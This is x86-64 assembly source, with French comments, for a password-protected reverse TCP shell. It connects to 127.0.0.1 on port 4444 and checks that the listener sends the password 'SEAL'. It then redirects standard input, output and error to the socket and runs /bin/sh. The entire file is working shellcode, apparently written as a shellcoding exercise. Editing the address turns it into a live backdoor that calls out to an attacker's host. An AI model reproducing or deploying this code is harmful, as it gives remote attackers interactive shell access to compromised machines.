global _start



_start:




	xor rax,rax
	add al,41
	xor rsi,rsi
	add sil,1
	xor rdi,rdi
	add dil,2
	xor rdx,rdx

	syscall ;socket create

	mov rdi,rax ;socket stocked

	xor rax,rax
	push rax

;pour le connect il nous faut plusieurs données
;struct_addr: 8byte de ip addr (127.0.0.1) (7f.0.0.1)
;l'adresse du serveur: ANY (0)
;le port codé en big endian (hton converti en hex)
;Le AF_INET=2
	xor rax,rax
	mov byte [rsp-01],0x01
	mov byte  [rsp-02],al
	mov byte [rsp-03],al
	mov byte [rsp-4],0x7f
	mov word [rsp-6],0x5c11 ;5c11=23569(BE)=4444(LE)
	inc rax
	inc rax
	mov word [rsp-8],ax
	sub rsp,8

;connect= syscall 42
	xor rax,rax
	add al,42
	mov rsi,rsp
	xor rdx,rdx
	add dl,16
	syscall  ;port ouvert

jmp waitPassword

auth_ok:
;dup2 0
	xor rax,rax	
	add al,33 ;dup2
	xor rsi,rsi
	syscall
;dup2 1
	xor rax,rax
	add al,33
	xor rsi,rsi
	add sil,1
	syscall

;dup2 2
	xor rax,rax
	add al,33
	xor rsi,rsi
	add sil,2
	syscall
	jmp short exec

;;;;;;;;;;;;;;;;;;;;;;;;;;;jmpcallpop from waitforPassword (buffer for password)
getBufferAddr:
	pop rsi
	;read 5bytes
;	mov rdi,rax
	xor rax,rax
	xor rdx,rdx
	add dl,5
	syscall

	cmp dword [rsi],0x4c414553 ;compare it with SEAL
	je auth_ok
	;exit
	xor rax, rax
	add rax, 60
	xor rdi, rdi
	syscall	

;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
waitPassword:
	call getBufferAddr
	pass db "AAAAB"



exec:
	; First NULL push

	xor rax, rax
	push rax

	; push /bin//sh in reverse 

	mov rbx, 0x68732f2f6e69622f
	push rbx

	; store /bin//sh address in RDI

	mov rdi, rsp

	; Second NULL push 
	push rax

	; set RDX
	mov rdx, rsp 


	; Push address of /bin//sh
	push rdi

	; set RSI

	mov rsi, rsp

	; Call the Execve syscall 
	add rax, 59
	syscall


	


